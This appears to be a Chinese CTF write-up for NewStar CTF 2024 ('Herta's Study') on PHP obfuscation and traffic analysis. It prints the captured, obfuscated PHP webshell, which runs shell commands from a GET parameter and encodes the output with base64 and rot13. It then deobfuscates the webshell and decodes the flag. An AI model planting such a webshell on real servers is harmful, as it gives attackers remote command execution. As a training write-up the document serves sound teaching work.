---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
# Herta's Study

本题考点：PHP混淆，流量分析

建议配合unk师傅的前两道流量题食用

第七条流量是上传的php木马

```php
<?php
    $payload=$_GET['payload'];
    $payload=shell_exec($payload);
    $bbb=create_function(
        base64_decode('J'.str_rot13('T').'5z'),
        base64_decode('JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp
        Kz0xKXsNCiAgICBpZigkaSUy'.str_rot13('CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m').'dHJfcm90MTMoJG5zWyRpXSk7DQo
        gICAgfQ0KfQ0KcmV0dXJuICRuczs==')
    );  
    echo $bbb($payload);
?>
```

(可以搜索一下create_funtion()函数) 解除混淆后得到加密代码

```php
$ns=base64_encode($ns);
for($i=0;$i<strlen($ns);$i+=1){
    if($i%2==1){
        $ns[$i]=str_rot13($ns[$i]);
    }
}
return $ns;
```

就是base64后把奇数位rot13

解码反过来就行（第38条，f.txt里的是真flag，另一个是假flag）

```php
<?php
$ns='ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==';
for($i=0;$i<strlen($ns);$i+=1){
    if($i%2==1){
        $ns[$i]=str_rot13($ns[$i]);
    }
}
echo base64_decode($ns);
//flag{sH3_i4_S0_6eAut1fuL.}
?>
```
